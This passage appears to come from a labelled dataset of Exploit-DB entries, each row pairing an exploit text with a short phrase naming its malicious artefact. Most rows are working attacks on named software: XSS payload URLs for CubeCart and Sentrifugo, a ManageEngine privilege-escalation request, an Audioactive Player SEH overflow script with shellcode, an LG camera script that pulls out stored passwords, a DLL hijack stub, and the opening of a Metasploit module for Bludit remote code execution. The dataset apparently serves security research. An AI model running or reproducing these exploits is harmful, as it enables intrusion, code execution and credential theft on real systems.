""-----------------------------"".$this->boundary.""--\r\n""; 		return $this->sock(); 	}  	 	/** 	 * This function returns the content of the server response 	 * without the headers. 	 *  	 * $this->getcontent($this->get(""http://localhost/"")); 	 * or 	 * $this->getcontent(); 	 * 	 * @param string $server_response 	 * @return $onlythecontent 	 */ 	public function getcontent($code='') 	{ 		if(empty($code)) $code = $this->recv; 		$content = explode(""\n"",$code); 		$onlycode = ''; 		for($i=1;$i<count($content);$i++) 		{ 			if(!preg_match(""/^(\S*):/"",$content[$i])) $ok = 1; 			if($ok) $onlycode .= $content[$i].""\n""; 		} 		return $onlycode; 	}  	 	/** 	 * This function returns the headers of the server response 	 * without the content. 	 *  	 * $this->getheader($this->post(""http://localhost/x.php"",""x=1&z=2"")); 	 * or 	 * $this->getheader(); 	 * 	 * @param string $server_response 	 * @return $onlytheheaders 	 */ 	public function getheader($code='') 	{ 		if(empty($code)) $code = $this->recv; 		$header = explode(""\n"",$code); 		$onlyheader = $header[0].""\n""; 		for($i=1;$i<count($header);$i++) 		{ 			if(!preg_match(""/^(\S*):/"",$header[$i])) break; 			$onlyheader .= $header[$i].""\n""; 		} 		return $onlyheader; 	}  	 	/** 	 * This function is called by the cookiejar() function. 	 * It adds the value of the ""Set-Cookie"" header in the ""Cookie"" 	 * header for the next request. You don't have to call it. 	 *  	 * @param string $server_response 	 */ 	private function getcookie($code) 	{ 		$carr = explode(""\n"",str_replace(""\r\n"",""\n"",$code)); 		for($z=0;$z<count($carr);$z++) 		{ 			if(preg_match(""/set-cookie: (.*)/i"",$carr[$z],$cookarr)) 			{ 				$cookie[] = preg_replace(""/expires=(.*)(GMT||UTC)(\S*)$/i"","""",preg_replace(""/path=(.*)/i"","""",$cookarr[1])); 			} 		}  		for($i=0;$i<count($cookie);$i++) 		{ 			preg_match(""/(\S*)=(\S*)(|;)/"",$cookie[$i],$matches); 	    	        $cookn = $matches[1]; 	    	        $cookv = $matches[2]; 	    	        $this->addcookie($cookn,$cookv); 		}     }  	 	/** 	 * This function is called by the get()/post() functions. 	 * You don't have to call it. 	 * 	 * @param string $urltarg 	 */ 	private function target($urltarg) 	{ 		if(!preg_match(""/^http:\/\/(.*)\//"",$urltarg)) $urltarg .= ""/""; 		$this->url=$urltarg; 		 		$array = explode(""/"",str_replace(""http://"","""",preg_replace(""/:(\d+)/"","""",$urltarg))); 		$this->host=$array[0];  		preg_match(""/:(\d+)\//"",$urltarg,$matches); 		$this->port=empty($matches[1]) ? 80 : $matches[1]; 		 		$temp = str_replace(""http://"","""",preg_replace(""/:(\d+)/"","""",$urltarg)); 		preg_match(""/\/(.*)\//"",$temp,$matches); 		$this->path=str_replace(""//"",""/"",""/"".$matches[1].""/""); 	 		if($this->port > 65535) die(""Error: Invalid port number""); 	} 	 	 	/** 	 * If you call this function, the script will 	 * extract all ""Set-Cookie"" headers values 	 * and it will automatically add them into the ""Cookie"" header 	 * for all next requests. 	 * 	 * $this->cookiejar(1); // enabled 	 * $this->cookiejar(0); // disabled 	 *  	 */ 	public function cookiejar($code) 	{ 		if($code===0) $this->cookiejar=''; 		if($code===1) $this->cookiejar=1; 		else 		{ 			$this->getcookie($code); 		} 	}   	/** 	 * If you call this function, the script will 	 * follow all redirections sent by the server. 	 *  	 * $this->allowredirection(1); // enabled 	 * $this->allowredirection(0); // disabled 	 *  	 * @return $this->get($locationresponse) 	 */ 	public function allowredirection($code) 	{ 		if($code===0) $this->allowredirection=''; 		if($code===1) $this->allowredirection=1; 		else 		{ 			if(preg_match(""/(location|content-location|uri): (.*)/i"",$code,$codearr)) 			{ 				$location = str_replace(chr(13),'',$codearr[2]); 				if(!eregi(""://"",$location)) 				{ 					return $this->get(""http://"".$this->host.$this->path.$location); 				} 				else 				{ 					return $this->get($location); 				} 			} 			else 			{ 				return $code; 			} 		} 	} 	 	 	/** 	 * This function allows you to reset some parameters: 	 *  	 * $this->reset(header); // headers cleaned 	 * $this->reset(cookie); // cookies cleaned 	 * $this->reset();       // clean all parameters 	 * 	 * @param string $func 	 */ 	public function reset($func='') 	{ 		switch($func) 		{ 			case ""header"": 			$this->header=''; 			break; 			 			case ""cookie"": 			$this->cookie=''; 			break; 			 			default: 		        $this->cookiejar=''; 		        $this->header=''; 		        $this->cookie=''; 		        $this->allowredirection='';  		        $this->agent=''; 		        break; 		} 	} } ?>  # milw0rm.com [2008-04-08]",add several headers in the request,1
28399,"CubeCart 3.0.x - Multiple Input Validation Vulnerabilities source: https://www.securityfocus.com/bid/19563/info  CubeCart is prone to multiple input-validation vulnerabilities, including cross-site scripting and SQL-injection issues, because the application fails to properly sanitize user-supplied input.   A successful exploit of these vulnerabilities could allow an attacker to compromise the application, access or modify data, steal cookie-based authentication credentials, or even exploit vulnerabilities in the underlying database implementation. Other attacks are also possible.  CubeCart 3.0.11 and earlier versions are vulnerable to these issues; other versions may also be affected.  http://www,example.com/[target]/[path_to_cubecart]/admin/filemanager/preview.php?file=""><script>alert(document.cookie)</script> http://www,example.com/[target]/[path_to_cubecart]/admin/filemanager/preview.php?file=1&x=""><script>alert(document.cookie)</script> http://www,example.com/[target]/[path_to_cubecart]/admin/filemanager/preview.php?file=1&y=""><script>alert(document.cookie)</script> http://www,example.com/[target]/[path_to_cubecart]/admin/login.php?email=""><script>alert(document.cookie)</script>",malicious PHP code,1
38694,"HTC Sync Manager - Multiple DLL Loading Arbitrary Code Execution Vulnerabilities source: https://www.securityfocus.com/bid/61745/info  HTC Sync Manager is prone to multiple arbitrary code-execution vulnerabilities.  An attacker can exploit these issues by enticing a legitimate user to use the vulnerable application to open a file from a network share location that contains a specially crafted Dynamic Link Library (DLL) file.  HTC Sync Manager 2.1.46.0 is vulnerable; other versions may also be affected.   #include <windows.h> #define DllExport __declspec (dllexport) DllExport void DwmSetWindowAttribute() { egg(); }  int egg() {     system (""calc"");         exit(0);         return 0; }",a specially crafted Dynamic Link Library (DLL) file,1
39450,"ManageEngine Network Configuration Management Build 11000 - Privilege Escalation =================================================================================== Privilege escalation Vulnerability in ManageEngine Network Configuration Management ===================================================================================  Overview ========  Title:- Privilege escalation Vulnerability in ManageEngine Network Configuration Management Author: Kaustubh G. Padwad Vendor: ZOHO Corp Product: ManageEngine Network Configuration Manager Tested Version: : Network Configuration Manager Build 11000 Severity: HIGH  Advisory ID ============ 2016-03-Manage_Engine  About the Product: ==================  Network Configuration Manager is a web–based, multi vendor network change, configuration and compliance management (NCCCM) solution for switches, routers, firewalls and other network devices. Trusted by thousands of network administrators around the world, Network Configuration Manager helps automate and take total control of the entire life cycle of device configuration management.  Description: ============  This Privilege escalation vulnerability enables an Normal user to escalate privilege and become administrator of the application.  Vulnerability Class: ==================== Top 10 2014-I2 Insufficient Authentication/Authorization https://www.owasp.org/index.php/Top_10_2014-I2_Insufficient_Authentication/Authorization   How to Reproduce: (POC): ========================  * you should have Operator Account on Network Configuration Management  * login with that account to get api key something like user_1453993872278  * Setup Burp and use change user password request and change userName to admin and newPwd to desire password HUrry you are admin now. :)  POC ====  Burp Requst ----------- POST /nfaapi/json/admin/changePassword HTTP/1.1  Host: 192.168.1.10:8080  User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.5.0  Accept: */*  Accept-Language: en-US,en;q=0.5  Accept-Encoding: gzip, deflate  Content-Type: application/x-www-form-urlencoded; charset=UTF-8  X-Requested-With: XMLHttpRequest  Referer: http://192.168.1.10:8080/netflow/ncmapiclient/ember/index.jsp  Content-Length: 50  Cookie: OPUTILSJSESSIONID=E062B23129AA1269EF13794C7710DF8E; JSESSIONID=FBA6ADEE16123786896DF765CA4C9E87; NFA_Jsession=0BF63F9CE8F4DCF664857F92403D8B44; iamcsrfcookie=fbcc4bcb-34ea-4cc8-8cb3-e95dbfc0603d; NFA__SSO=0ED579E64493B973F5BCA1C94EAD6310  Connection: keep-alive  Pragma: no-cache  Cache-Control: no-cache    userName=admin&newPwd=11&apiKey=king_1453993872278   Response -------- HTTP/1.1 200 OK  Server: Apache-Coyote/1.1  Access-Control-Allow-Origin: *  Access-Control-Allow-Methods: GET,POST  Access-Control-Max-Age: 5000  Content-Type: application/json;charset=UTF-8  Date: Sat, 30 Jan 2016 20:22:15 GMT  Content-Length: 23    {""message"":""success""}    Mitigation ==========  * Please Stop Network configuration manager  service. * Open Ncm\lib and cut AdvNCM.jar and paste it in to Desktop. * Download the AdvNCM.jar file from below link and paste it under Ncm\lib * https://uploads.zohocorp.com/Internal_Useruploads/dnd/DeviceExpert/o_1ab396o1i1a6v8j1cr86uet581/AdvNCM.jar * Open Ncm\logs and delete all the files inside it, * Start the Ncm service and check the issue.  Disclosure: =========== * 31-JAN-2016 Repoerted to vendor * 31-Feb-2016 Ack by Vendor * 09-Feb-2016 Fixed By Vendor  credits: ======== * Kaustubh Padwad * Information Security Researcher * kingkaustubh@me.com * https://twitter.com/s3curityb3ast * http://breakthesec.com * https://www.linkedin.com/in/kaustubhpadwad",a specially crafted .jar file,1
29452,"Apple Mac OSX 10.4.8 - DMG UFS UFS_LookUp Denial of Service source: https://www.securityfocus.com/bid/22036/info  Apple Mac OS X is prone to a remote denial-of-service vulnerability. This issue occurs when the UFS filesystem handler fails to handle specially crafted DMG images.  A successful exploit can allow a remote attacker to cause kernel panic, resulting in a denial-of-service condition.  Mac OS X 10.4.8 is vulnerable; other versions may also be affected.   https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/29452.dmg.gz",specially crafted DMG images,1
8701,"Audioactive Player 1.93b - '.m3u' Local Buffer Overflow (SEH) #usage: exploit.py #Open the program then double clic in the exploit file print ""**************************************************************************"" print "" Audioactive Player 1.93b (.m3u) Local Buffer Overflow Exploit (SEH)\n"" print "" Credits : hack4love\n"" print "" Seh Exploit: His0k4\n"" print "" Tested on: Windows XP Pro SP3 (EN)\n"" print "" Greetings to:"" print "" All friends & muslims HaCkers(dz),snakespc.com\n"" print ""**************************************************************************""        			 # win32_exec -  EXITFUNC=seh CMD=calc Size=165 Encoder=JmpCallAdditive http://metasploit.com shellcode=( ""\xfc\xbb\x5d\x53\x65\x97\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3\x85"" ""\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\xa1\xbb\x21\x97\x59\x3c\x21"" ""\xd2\x65\xb7\x49\xd8\xed\xc6\x5e\x69\x42\xd1\x2b\x31\x7c\xe0\xc0"" ""\x87\xf7\xd6\x9d\x19\xe9\x26\x62\x80\x59\xcc\xa2\xc7\xa6\x0c\xe8"" ""\x25\xa9\x4c\x06\xc1\x92\x04\xfd\x2e\x91\x41\x76\x71\x7d\x8b\x62"" ""\xe8\xf6\x87\x3f\x7e\x57\x84\xbe\x6b\xec\xa8\x4b\x6a\x19\x59\x17"" ""\x49\xd9\x99\x99\x51\x85\x96\x9a\x61\xc0\x69\x62\x8e\x41\x29\x9f"" ""\x05\x25\xb6\x32\x92\xad\xce\xa7\xac\xa6\x4f\x87\xaf\xb8\x4f\x63"" ""\xc7\x84\x10\x42\xee\x94\xf8\x2d\xf6\xd7\xc5\x55\x57\xbf\x35\x23"" ""\x53\x60\xde\xac\xa2\x14\x10\x9a\xa5\xcf\x4e\x45\x36\x6c\x91\x85"" ""\xc6\x72\x91\x85\xc6"")  payload = ""\x41""*(589-len(shellcode)) payload += shellcode payload += ""\xE9\x56\xFF\xFF\xFF"" # go back payload += ""\x74\xF9\xFF\xFF"" #go back payload += ""\xDE\x19\xD1\x72"" # Friendly p/p/r msacm32.drv payload += ""\x44""*900  try:     out_file = open(""exploit.m3u"",'w')     out_file.write(""http://www.google.com/""+payload+"".mp3\r\n"")     out_file.close()     raw_input(""\nExploit file created!\n"") except:     print ""Error""  # milw0rm.com [2009-05-15]",a specially crafted .m3u file,1
24103,"MailEnable Mail Server HTTPMail 1.x - Remote Heap Overflow source: https://www.securityfocus.com/bid/10312/info  MailEnable is a commercially available POP3 and SMTP server for the Windows platform.  The 'Professional' and 'Enterprise' editions of MailEnable are reported to be prone to a remote heap buffer overflow. The overflow allows the attacker to control the EAX and ECX registers, allowing arbitrary code execution as SYSTEM.  All versions up to and including 1.18 are reported to be affected.  If logging is enabled, the request could contain:  GET /{4032 x A} HTTP/1.1  or, without logging:  GET /{8501 x A} HTTP/1.1",malicious e-mail,1
45394,"LG Smart IP Camera 1508190 - Backup File Download # Exploit Title: LG Smart IP Camera 1508190 - Backup File Download # Date: 2018-09-11 # Exploit Author: Ege Balci # Vendor Homepage: https://www.lg.com # Software version: 1310250 <= 1508190 # Model: LNB*/LND*/LNU*/LNV* # CVE: CVE-2018-16946  # Description: smart network camera devices have broken access control. Attackers are able to  # download /updownload/t.report (aka Log & Report) files and download backup files (via download.php)  # without authenticating. These backup files contain user credentials and configuration information for  # the camera device. An attacker is able to discover the backup filename via reading the system logs or  # report data, or just by brute-forcing the backup filename pattern. It may be possible to authenticate  # to the admin account with the admin password.  # lg_smart_ip.py  #!/usr/bin/python3  import os import sys import sqlite3 import tarfile import requests     import datetime import threading  if len(sys.argv) < 2:     print(""Usage:\n\t""+sys.argv[0]+"" <TARGET-URL>"")     exit(0)  print(""#==========================================================================#"") print(""# Exploit Title: LG Smart IP Device Backup Download"") print(""# Date: 09-11-2018"") print(""# Exploit Author: Ege BalcÄ±"") print(""# Vendor Homepage: https://www.lg.com"") print(""# Model: LNB*/LND*/LNU*/LNV*"") print(""# CVE: CVE-2018-16946"") print(""#==========================================================================#\n\n"")  model_version_list = [""2219.0.0.1505220"",""2745.0.0.1508190"",""1954.0.0.1410150"", ""1030.0.0.1310250""]   # First try the default login creds... headers = {'Authorization': 'Basic YWRtaW46YWRtaW4='} default = requests.get(sys.argv[1]+""/httpapi?GetDeviceInformation"", headers=headers) if ""Model:"" in default.text:     print(""[+] Default password works  (admin:admin)"")     # exit(0)   def brute(model_version):     date = datetime.datetime.now()     u = (['\\','|','/','-'])      for i in range(0,3650): # No need to go back futher these cameras didn't existed 10 years ago          sys.stdout.flush()         sys.stdout.write(""\r[*] Bruteforing backup date...{0}"".format(u[i%4]))          log_date = date.strftime(""%y"")         log_date += date.strftime(""%m"")         log_date += date.strftime(""%d"")                  url = ""/download.php?file=""         backup_name = ""backup_""         backup_name += log_date         backup_name += ""_""+model_version+"".config""                   ContentLength = requests.head(sys.argv[1]+url+backup_name,stream=True).headers[""Content-Length""]         if ContentLength != """":             backup = requests.get(sys.argv[1]+url+backup_name)             print(""\n[+] Backup file found !"")             print(""[+] ""+backup_name+"" -> ""+str(len(backup.content))+""\n"")             backup_file = open(backup_name+"".tar.gz"",""wb"")             backup_file.write(backup.content)             backup_file.close()             tar = tarfile.open(str(backup_name+"".tar.gz""),mode=""r:gz"")             for member in tar.getnames():                 # Print contents of every file                 print(""[>] ""+member)                 mem = open(member,""wb"")                 mem.write(tar.extractfile(member).read())                                       conn = sqlite3.connect('mipsca.db')             c = conn.cursor()             users = c.execute(""SELECT * FROM User"")             print(""#=============== SUCCESS ===============#"")             for u in users:                 print(""\n[#] Username: ""+u[0])                 print(""[#] Password: ""+u[1])             os.system(""rm mipsca.db ConfigInfo.txt ""+ backup_name+"".tar.gz"")             break         date = (date-datetime.timedelta(days=1))    report = requests.get(sys.argv[1]+""/updownload/t.report"",verify=False) if report.status_code != 200:     print(""[-] Target device don't have report data :("")     jobs = []     for mv in model_version_list:         t = threading.Thread(target=brute(mv))         jobs.append(t)      for j in jobs:         j.start() else:     model_id = (((report.text.split(""= ""))[1]).split(""\n""))[0]     print(""[+] Model ID: ""+model_id)     version = (((report.text.split(""= ""))[2]).split(""\n""))[0]     print(""[+] Version: ""+version)     brute(model_id+"".""+version)",bruteforcing the backup filename pattern,1
48446,"Sentrifugo CMS 3.2 - Persistent Cross-Site Scripting # Exploit Title: Sentrifugo CMS 3.2 - Persistent Cross-Site Scripting # Dork: N/A # Date: 2020-05-06 # Exploit Author: Vulnerability-Lab # Vendor: http://www.sentrifugo.com/ # Link: http://www.sentrifugo.com/download # Version: 3.2 # Category: Webapps # CVE: N/A  Document Title: =============== Sentrifugo v3.2 CMS - Persistent XSS Web Vulnerability   References (Source): ==================== https://www.vulnerability-lab.com/get_content.php?id=2229   Product & Service Introduction: =============================== http://www.sentrifugo.com/ http://www.sentrifugo.com/download   Affected Product(s): ==================== Sentrifugo Product: Sentrifugo v3.2 - CMS (Web-Application)   Vulnerability Disclosure Timeline: ================================== 2020-05-05: Public Disclosure (Vulnerability Laboratory)   Technical Details & Description: ================================ A persistent input validation web vulnerability has been discovered in the official Mahara v19.10.2 CMS web-application series. The vulnerability allows remote attackers to inject own malicious script codes with persistent attack vector to compromise browser to web-application requests from the application-side.  The persistent vulnerability is located in the `expense_name` parameters of the `/expenses/expenses/edit` module in the `index.php` file. Remote attackers with low privileges are able to inject own malicious persistent script code as expenses entry. The injected code can be used to attack the frontend or backend of the web-application. The request method to inject is POST and the attack vector is located on the application-side. Entries of expenses can be reviewed in the backend by higher privileged accounts as well.  Successful exploitation of the vulnerabilities results in session hijacking, persistent phishing attacks, persistent external redirects to malicious source and persistent manipulation of affected application modules.  Request Method(s): [+] POST  Vulnerable Module(s): [+] index.php/expenses/expenses/edit  Vulnerable Input(s): [+] Expenses Name  Vulnerable File(s): [+] index.php  Vulnerable Parameter(s): [+] expense_name  Affected Module(s): [+] index.php/expenses/expenses   Proof of Concept (PoC): ======================= The persistent web vulnerability can be exploited by low privileged web application user account with low user interaction. For security demonstration or to reproduce the vulnerability follow the provided information and steps below to continue.   PoC: Vulnerable Source <div id=""maincontentdiv"">	 <div id=""dialog-confirm"" style=""display:none;""> <div class=""newframe-div""> <div class=""new-form-ui height32""> <div class=""division""> <input type=""text"" maxlength=""12"" id=""number_value"" name=""number_value""></div> <span class=""errors"" id=""errors-contactnumber""></span></div></div></div>								 <div id=""empstatus-alert"" style=""display:none;""> <div class=""newframe-div""><div id=""empstatusmessage""></div></div></div> <div id=""empleaves-alert"" style=""display:none;""> <div class=""newframe-div""><div id=""empleavesmessage""></div></div></div>	   --- PoC Session Logs [POST] --- (Expenses Inject) http://sentrifugo.localhost:8080/index.php/expenses/expenses/edit Host: sentrifugo.localhost:8080 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Content-Type: application/x-www-form-urlencoded Content-Length: 352 Origin: http://sentrifugo.localhost:8080 Connection: keep-alive Referer: http://sentrifugo.localhost:8080/index.php/expenses/expenses/edit Cookie: PHPSESSID=h67jk6dashpvgn5n3buc6uia87; _ga=GA1.2.788961556.1587849443; _gid=GA1.2.1158360779.1587849443 id=&limit=&offset=&parameter=all&currencyid=1&file_original_names=&file_new_names=&last_inserted_receipts=&receiptId=&expense_Id=& expense_name=<img src=""evil.source"" onload=alert(document.domain)>&category_id=&project_id=&expense_date=&expense_currency_id=2& expense_amount=&cal_amount=0&is_from_advance=&expense_payment_id=&expense_payment_ref_no=&trip_id=&description=&post_receipt_ids=&submit=Save - POST: HTTP/1.1 200 OK Server: Apache/2.2.22 (Ubuntu) X-Powered-By: PHP/5.3.10-1ubuntu3.10 Vary: Accept-Encoding Content-Encoding: gzip Content-Length: 19284 Keep-Alive: timeout=5, max=100 Connection: Keep-Alive Content-Type: text/html   Reference(s): http://sentrifugo.localhost:8080/index.php http://sentrifugo.localhost:8080/index.php/expenses http://sentrifugo.localhost:8080/index.php/expenses/expenses/ http://sentrifugo.localhost:8080/index.php/expenses/expenses/edit   Credits & Authors: ================== Vulnerability-Lab - https://www.vulnerability-lab.com/show.php?user=Vulnerability-Lab Benjamin Kunz Mejri - https://www.vulnerability-lab.com/show.php?user=Benjamin%20K.M.   --  VULNERABILITY LABORATORY - RESEARCH TEAM SERVICE: www.vulnerability-lab.com",inject own malicious script codes with persistent attack vector,1
47270,"Adobe Acrobat Reader DC for Windows - Heap-Based Out-of-Bounds read due to Malformed JP2 Stream We have observed the following access violation exception in the latest version of Adobe Acrobat Reader DC for Windows, when opening a malformed PDF file:  --- cut --- (180c.327c): Access violation - code c0000005 (first chance) First chance exceptions are reported before any exception handling. This exception may be expected and handled. eax=27829020 ebx=1537d7d8 ecx=00000030 edx=00000001 esi=27828ff0 edi=1537d890 eip=609ed114 esp=2ad6a1c0 ebp=2ad6a208 iopl=0         nv up ei pl nz na po nc cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010202 VCRUNTIME140!TrailingDownVec+0x1d4: 609ed114 f30f6f4e10      movdqu  xmm1,xmmword ptr [esi+10h] ds:002b:27829000=????????????????????????????????  0:014> kb  # ChildEBP RetAddr  Args to Child               00 2ad6a1c4 10dfaec3 1537d890 27828ff0 00000030 VCRUNTIME140!TrailingDownVec+0x1d4 [f:\dd\vctools\crt\vcruntime\src\string\i386\memcpy.asm @ 635]  01 2ad6a208 10d737f2 153156b0 27828ff0 00000010 AGM!AGMGetVersion+0x74273 02 2ad6a244 10d7522f 2ad6a27c 153156b0 27828ff0 AGM!AGMTerminate+0x14f42 03 2ad6a290 0f5ab6b8 2ad6a2b4 153158b8 27828ff0 AGM!AGMTerminate+0x1697f 04 2ad6a2b8 0f49861b 1b7a27f4 27828ff0 00000010 AcroRd32!AX_PDXlateToHostEx+0x1fd668 05 2ad6a2f8 0f692cea 1b7a27f4 27828ff0 00000010 AcroRd32!AX_PDXlateToHostEx+0xea5cb 06 2ad6a414 0f21a7d9 00000001 d497abe9 00000000 AcroRd32!AX_PDXlateToHostEx+0x2e4c9a 07 2ad6a4c8 0f219928 2ad6a870 00000000 d497a735 AcroRd32!DllCanUnloadNow+0x181819 08 2ad6a814 0f2198e6 2ad6a870 1b577188 d497a76d AcroRd32!DllCanUnloadNow+0x180968 09 2ad6a84c 0f2197c1 2ad6a870 1b577188 2ad6a8dc AcroRd32!DllCanUnloadNow+0x180926 0a 2ad6a8b8 0f218788 c0010000 000001bd 1b577188 AcroRd32!DllCanUnloadNow+0x180801 0b 2ad6ad18 0f215cd7 2ad6b01c 0c3d578c c0010000 AcroRd32!DllCanUnloadNow+0x17f7c8 0c 2ad6c4f8 0f215955 0c3d578c c0010000 000001bd AcroRd32!DllCanUnloadNow+0x17cd17 0d 2ad6c5c8 0f1f93ed d497c989 1b577188 00000000 AcroRd32!DllCanUnloadNow+0x17c995 0e 2ad6c6a8 0f270753 00000000 00000000 00000000 AcroRd32!DllCanUnloadNow+0x16042d 0f 2ad6c708 0f218184 00000000 00000000 00000000 AcroRd32!CTJPEGDecoderRelease+0x358c3 10 2ad6dedc 0f215955 0c3d5708 c0010000 000001be AcroRd32!DllCanUnloadNow+0x17f1c4 11 2ad6dfac 0f1f93ed d497efad 0c3c08a0 00000000 AcroRd32!DllCanUnloadNow+0x17c995 12 2ad6e08c 0f270753 00000001 00000000 00000000 AcroRd32!DllCanUnloadNow+0x16042d 13 2ad6e0ec 0f218184 00000001 00000000 00000000 AcroRd32!CTJPEGDecoderRelease+0x358c3 14 2ad6f8c0 0f215955 0c3d5684 c0010000 000001b2 AcroRd32!DllCanUnloadNow+0x17f1c4 15 2ad6f990 0f1f93ed d497f551 00000000 1b79f458 AcroRd32!DllCanUnloadNow+0x17c995 16 2ad6fa70 0f222848 00000000 00000000 00000000 AcroRd32!DllCanUnloadNow+0x16042d 17 2ad6fac8 0f222647 00000000 00000000 0f2220d0 AcroRd32!DllCanUnloadNow+0x189888 18 2ad6fb34 0f221fec d497f47d 0f221540 15ab5938 AcroRd32!DllCanUnloadNow+0x189687 19 2ad6fb5c 0f221551 0d104ab8 0f221540 2ad6fb80 AcroRd32!DllCanUnloadNow+0x18902c 1a 2ad6fb6c 73cf8674 15ab5938 73cf8650 e681ff4b AcroRd32!DllCanUnloadNow+0x188591 1b 2ad6fb80 77285e17 15ab5938 c47e6da9 00000000 KERNEL32!BaseThreadInitThunk+0x24 1c 2ad6fbc8 77285de7 ffffffff 772aad8d 00000000 ntdll!__RtlUserThreadStart+0x2f 1d 2ad6fbd8 00000000 0f221540 15ab5938 00000000 ntdll!_RtlUserThreadStart+0x1b  0:014> !heap -p -a 27828ff0      address 27828ff0 found in     _DPH_HEAP_ROOT @ c1a1000     in busy allocation (  DPH_HEAP_BLOCK:         UserAddr         UserSize -         VirtAddr         VirtSize)                                 28631e38:         27828ff0               10 -         27828000             2000           ? windows_storage!CStorageItemsDataFormat::SetFromStorageItemsArray<Windows::Foundation::Collections::IIterable<Windows::Storage::StorageFolder *>,<lambda_3b893a90b183593f6fe9d34608c3a173> >+b4     66d6a8d0 verifier!AVrfDebugPageHeapAllocate+0x00000240     77304b26 ntdll!RtlDebugAllocateHeap+0x0000003c     7725e3e6 ntdll!RtlpAllocateHeap+0x000000f6     7725cfb7 ntdll!RtlpAllocateHeapInternal+0x000002b7     7725ccee ntdll!RtlAllocateHeap+0x0000003e     66e5aa2f vrfcore!VfCoreRtlAllocateHeap+0x0000001f     74a2f1f6 ucrtbase!_malloc_base+0x00000026     0f04fcd9 AcroRd32!AcroWinMainSandbox+0x00003ed9     0f6933e4 AcroRd32!AX_PDXlateToHostEx+0x002e5394     0f692a25 AcroRd32!AX_PDXlateToHostEx+0x002e49d5     0f21a7d9 AcroRd32!DllCanUnloadNow+0x00181819     0f219928 AcroRd32!DllCanUnloadNow+0x00180968     0f2198e6 AcroRd32!DllCanUnloadNow+0x00180926     0f2197c1 AcroRd32!DllCanUnloadNow+0x00180801     0f218788 AcroRd32!DllCanUnloadNow+0x0017f7c8     0f215cd7 AcroRd32!DllCanUnloadNow+0x0017cd17     0f215955 AcroRd32!DllCanUnloadNow+0x0017c995     0f1f93ed AcroRd32!DllCanUnloadNow+0x0016042d     0f270753 AcroRd32!CTJPEGDecoderRelease+0x000358c3     0f218184 AcroRd32!DllCanUnloadNow+0x0017f1c4     0f215955 AcroRd32!DllCanUnloadNow+0x0017c995     0f1f93ed AcroRd32!DllCanUnloadNow+0x0016042d     0f270753 AcroRd32!CTJPEGDecoderRelease+0x000358c3     0f218184 AcroRd32!DllCanUnloadNow+0x0017f1c4     0f215955 AcroRd32!DllCanUnloadNow+0x0017c995     0f1f93ed AcroRd32!DllCanUnloadNow+0x0016042d     0f222848 AcroRd32!DllCanUnloadNow+0x00189888     0f222647 AcroRd32!DllCanUnloadNow+0x00189687     0f221fec AcroRd32!DllCanUnloadNow+0x0018902c     0f221551 AcroRd32!DllCanUnloadNow+0x00188591     73cf8674 KERNEL32!BaseThreadInitThunk+0x00000024     77285e17 ntdll!__RtlUserThreadStart+0x0000002f --- cut ---  Notes:  - Reproduces on Adobe Acrobat Reader DC (2019.012.20035) on Windows 10, with the PageHeap option in Application Verifier enabled.  - The crash occurs immediately after opening the PDF document.  - The crash occurs inside of the memcpy() function while trying to read from out-of-bounds memory, and its arguments indicate that the program tries to copy 0x30 (48) bytes out of a 0x10-byte heap-based buffer.   - Attached samples: poc1.pdf (crashing file), poc2.pdf (crashing file), original.pdf (original file).  - We have minimized the difference between the original and mutated files down to a single byte at offset 0x30b35f, changed from the original value of 0x11 to 0x10 (in the first sample) or to 0x15 (in the second sample). This byte appears to reside inside of a binary JP2K image stream.  - We classify the bug as an information disclosure issue.   Proof of Concept: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/47270.zip",a malformed PDF file,1
47699,"Bludit - Directory Traversal Image File Upload (Metasploit) ## # This module requires Metasploit: https://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ##  class MetasploitModule < Msf::Exploit::Remote   Rank = ExcellentRanking    include Msf::Exploit::Remote::HttpClient   include Msf::Exploit::PhpEXE   include Msf::Exploit::FileDropper   include Msf::Auxiliary::Report    def initialize(info={})     super(update_info(info,       'Name'           => ""Bludit Directory Traversal Image File Upload Vulnerability"",       'Description'    => %q{         This module exploits a vulnerability in Bludit. A remote user could abuse the uuid         parameter in the image upload feature in order to save a malicious payload anywhere         onto the server, and then use a custom .htaccess file to bypass the file extension         check to finally get remote code execution.       },       'License'        => MSF_LICENSE,       'Author'         =>         [           'christasa', # Original discovery           'sinn3r'     # Metasploit module         ],       'References'     =>         [           ['CVE', '2019-16113'],           ['URL', 'https://github.com/bludit/bludit/issues/1081'],           ['URL', 'https://github.com/bludit/bludit/commit/a9640ff6b5f2c0fa770ad7758daf24fec6fbf3f5#diff-6f5ea518e6fc98fb4c16830bbf9f5dac' ]         ],       'Platform'       => 'php',       'Arch'           => ARCH_PHP,       'Notes'          =>         {           'SideEffects' => [ IOC_IN_LOGS ],           'Reliability' => [ REPEATABLE_SESSION ],           'Stability'   => [ CRASH_SAFE ]         },       'Targets'        =>         [           [ 'Bludit v3.9.2', {} ]         ],       'Privileged'     => false,       'DisclosureDate' => ""2019-09-07"",       'DefaultTarget'  => 0))      register_options(       [         OptString.new('TARGETURI', [true, 'The base path for Bludit', '/']),         OptString.new('BLUDITUSER', [true, 'The username for Bludit']),         OptString.new('BLUDITPASS', [true, 'The password for Bludit'])       ])   end    class PhpPayload     attr_reader :payload     attr_reader :name      def initialize(p)       @payload = p       @name = ""#{Rex::Text.rand_text_alpha(10)}.png""     end   end    class LoginBadge     attr_reader   :username     attr_reader   :password     attr_accessor :csrf_token     attr_accessor :bludit_key      def initialize(user, pass, token, key)       @username = user       @password = pass       @csrf_token = token       @bludit_key = key     end   end    def check     res = send_request_cgi({       'method' => 'GET',       'uri'    => normalize_uri(target_uri.path, 'index.php')     })      unless res       vprint_error('Connection timed out')       return CheckCode::Unknown     end      html = res.get_html_document     generator_tag = html.at('meta[@name=""generator""]')     unless generator_tag       vprint_error('No generator metadata tag found in HTML')       return CheckCode::Safe     end      content_attr = generator_tag.attributes['content']     unless content_attr       vprint_error(""No content attribute found in metadata tag"")       return CheckCode::Safe     end      if content_attr.value == 'Bludit'       return CheckCode::Detected     end      CheckCode::Safe   end    def 